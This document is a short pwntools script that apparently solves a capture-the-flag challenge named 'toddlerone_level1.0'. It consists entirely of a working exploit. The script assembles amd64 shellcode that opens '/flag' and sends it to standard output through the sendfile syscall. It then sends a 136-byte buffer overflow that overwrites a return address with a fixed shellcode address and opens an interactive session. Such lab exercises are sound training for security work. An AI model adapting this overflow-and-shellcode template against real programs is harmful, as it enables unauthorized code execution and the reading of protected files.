from pwn import *
context.arch='amd64'

r = process('/challenge/toddlerone_level1.0')

payload = asm(
'''

    mov rax, 2
    lea rdi, [rip+f]
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, 1
    mov rsi, rax
    mov rax, 40
    mov rdx, 0
    mov r10, 100
    syscall



    f:
    .string "/flag"

'''
)


r.send(payload)

r.send(b'a'*136 + p64(0x2c336000))
r.interactive()